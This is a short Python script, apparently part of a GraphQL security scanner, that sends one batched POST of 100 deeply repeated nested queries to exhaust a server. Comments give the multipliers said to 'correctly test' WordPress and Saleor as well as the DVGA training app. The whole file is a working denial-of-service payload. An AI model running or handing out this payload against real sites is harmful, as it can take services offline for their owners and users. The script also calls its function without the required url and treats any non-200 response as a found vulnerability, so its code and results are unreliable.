import requests
def test_denialOfService(url, auth_token=None):
    # 100 for both correctly tests DVGA without completely crashing
    # 10000 and 1000 correctly tests WP
    # 10000 and 1000 correctly tests Saleor
    FORCE_MULTIPLIER = 100
    CHAINED_REQUESTS = 100
    queries = []
    
    payload = 'content \n comments { \n nodes { \n content } }' * FORCE_MULTIPLIER
    query = {'query':'query { \n posts { \n nodes { \n ' + payload + '} } }'}
    
    for _ in range(0, CHAINED_REQUESTS):
        queries.append(query)

    r = requests.post(url, json=queries)
    if (r.status_code == 200):
        return "Denial of Service vulnerability not found. The server is still responsive."
    else:
        return "Denial of Service vulnerability found. The server may have crashed or become unresponsive."
    
test_denialOfService()